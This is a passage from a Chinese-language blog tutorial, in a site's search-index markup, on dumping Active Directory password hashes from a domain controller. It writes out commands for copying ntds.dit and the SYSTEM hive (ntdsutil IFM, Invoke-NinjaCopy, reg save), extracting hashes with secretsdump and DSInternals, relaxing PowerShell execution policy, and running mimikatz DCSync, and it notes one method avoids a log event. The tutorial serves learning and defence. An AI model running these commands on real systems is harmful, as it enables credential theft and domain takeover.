src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629155406474.png" alt="image-20210629155406474"></p><h4 id="创建IFM提取Ntds-dit文件"><a href="#创建IFM提取Ntds-dit文件" class="headerlink" title="创建IFM提取Ntds.dit文件"></a>创建IFM提取Ntds.dit文件</h4><p>在使用ntdsutil创建创建媒体安装集(IFM)时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，我们可以利用该过程获取NTDS.dit文件，需要管理员权限。</p><p>创建ifm，目录名为test，创建后访问test目录能看到ntds.dit和SYSTEM文件，复制出来后删除test目录即可</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil "ac i ntds" "ifm" "create full c:/test" q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629162245431.png" alt="image-20210629162245431"></p><h4 id="PowerSploit中的Invoke-NinjaCopy脚本"><a href="#PowerSploit中的Invoke-NinjaCopy脚本" class="headerlink" title="PowerSploit中的Invoke-NinjaCopy脚本"></a>PowerSploit中的Invoke-NinjaCopy脚本</h4><p>地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p><p>该脚本用于“万能复制”，像windows主机里SAM文件、域控中的Ntds.dit，里面数据很多有价值的信息，普通的COPY命令是无法复制的，使用万能复制可以复制这类文件。</p><p>该脚本通过读取原始卷并解析NTFS结构，从NTFS分区卷复制文件。</p><p>使用方法：</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\ntds.dit"Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\system.hive"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>★★★ <strong>这种方法没有调用Volume Shadow Copy服务，所以不会产生系统日志文件7036(卷影拷贝服务进入运行状态的标志)。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629170658418.png" alt="image-20210629170658418"></p><h3 id="3、SYSTEM文件获取"><a href="#3、SYSTEM文件获取" class="headerlink" title="3、SYSTEM文件获取"></a>3、SYSTEM文件获取</h3><p>SYSTEM中保存ntds.dit的加密密钥，且同样需要绕过windows锁对其读写</p><p>获取ntds.dit文件的相关方法同样适用于此，也可以使用reg命令提取：</p><pre class="line-numbers language-none"><code class="language-none">reg save hklm\system c:\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、导出ntds-dit中的hash"><a href="#4、导出ntds-dit中的hash" class="headerlink" title="4、导出ntds.dit中的hash"></a>4、导出ntds.dit中的hash</h3><h4 id="Impacket中的secretsdump"><a href="#Impacket中的secretsdump" class="headerlink" title="Impacket中的secretsdump"></a>Impacket中的secretsdump</h4><p>该脚本可远程dump出域控主机的ntds.dit文件中的hash，也可以本地使用</p><p><strong>PS：该脚本默认使用的是drsuapi，此类api实现目录复制服务远程协议Directory Replication Service (DRS) Remote Protocol</strong></p><p>本地导出system.hive和ntds.dit文件进行测试如下：</p><pre class="line-numbers language-none"><code class="language-none">python3 examples/secretsdump.py -system winhash/system.hive -ntds winhash/ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629210600399.png" alt="image-20210629210600399"></p><p>secretsdump.py默认使用的drsuapi导出，设置选项也支持vss方式导出</p><h4 id="DSInternals-PowerShell模块"><a href="#DSInternals-PowerShell模块" class="headerlink" title="DSInternals PowerShell模块"></a>DSInternals PowerShell模块</h4><p>powershell 5版本以上的直接使用命令安装</p><pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5以下版本的下载release通过import-module使用</p><p>Ps: powershell一般有执行策略限制，如果导入报警需要使用命令设置策略宽松，如下</p><pre class="line-numbers language-none"><code class="language-none">Set-ExecutionPolicy unRestricted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而后就可以导入模块，跑出SYSTEM中的密钥，而后跑出用户hash</p><pre class="line-numbers language-none"><code class="language-none">Get-Bootkey -SystemHivePath "C:\Users\xxx\Desktop\fotest\SYSTEM"Get-ADDBAccount -All -DBPath 'C:\Users\xxx\Desktop\fotest\ntds.dit' -Bootkey &lt;KEY&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629220010099.png" alt="image-20210629220010099"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629220448493.png" alt="image-20210629220448493"></p><h4 id="mimikatz在线提取"><a href="#mimikatz在线提取" class="headerlink" title="mimikatz在线提取"></a>mimikatz在线提取</h4><p>mimikatz中利用dcsync可提取域控上Ntds.dit中的hash，该方法需要域管权限，在任意域内机器上使用。</p><p>在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据，如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，模仿一个域控，从真实的域控中请求数据，通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求。</p><p>使用命令：</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync /domain:xxx.com (/user:administrator) /all /csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210701090342107.png" alt="image-20210701090342107"></p><h3 id="End"><a href="#End" class="headerlink" title="End"></a>End</h3><p>写完啦，东拼西凑做了个小总结，算是一个复现吧，由于刚刚学习网知识，有不正确的地方请指正</p><h5 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h5><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync</a></p><p><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p>]]></content>
      
      
      <categories>
          
          <category> windows内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> vssadmin </tag>
            
            <tag> mimikatz </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
